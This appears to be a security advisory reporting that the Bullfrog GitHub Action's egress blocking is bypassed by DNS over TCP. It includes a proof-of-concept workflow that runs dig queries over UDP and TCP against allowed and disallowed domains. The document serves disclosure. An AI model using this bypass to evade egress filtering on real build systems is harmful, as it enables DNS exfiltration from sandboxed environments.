summary: "Bullfrog's DNS over TCP bypasses domain filtering\n### Summary\n\nUsing tcp breaks\
  \ blocking and allows DNS exfiltration. \n\n### PoC\n\n```\nname: test\non:\n  push:\n   \
  \ branches:\n      - \"*\"\n\njobs:\n  testBullFrog:\n    runs-on: ubuntu-22.04\n    steps:\n\
  \      - name: Use google dns\n        run: |\n          sudo resolvectl dns eth0 1.1.1.1\n\
  \          resolvectl status\n      - name: Set up bullfrog to block everything\n        uses:\
  \ bullfrogsec/bullfrog@1472c28724ef13ea0adc54d0a42c2853d42786b1 # v0.8.2\n        with:\n\
  \           egress-policy: block\n           allowed-domains: |\n             *.github.com\n\
  \      - name: Test connectivity\n        run: |\n          echo testing udp allowed ..\n\
  \          dig api.github.com @1.1.1.1 || :\n          echo testing tcp allowed ..\n     \
  \     dig api.github.com @1.1.1.1 +tcp || :\n\n          echo testing udp not allowed\n  \
  \        dig api.google.com @1.1.1.1 || :\n          echo testing tcp not allowed\n      \
  \    dig api.google.com @1.1.1.1 +tcp || :\n```\n\n### Impact\n\nsandbox bypass\n\n![image](https://github.com/user-attachments/assets/fba18a17-2d49-48cd-9aae-713e95b5270d)"
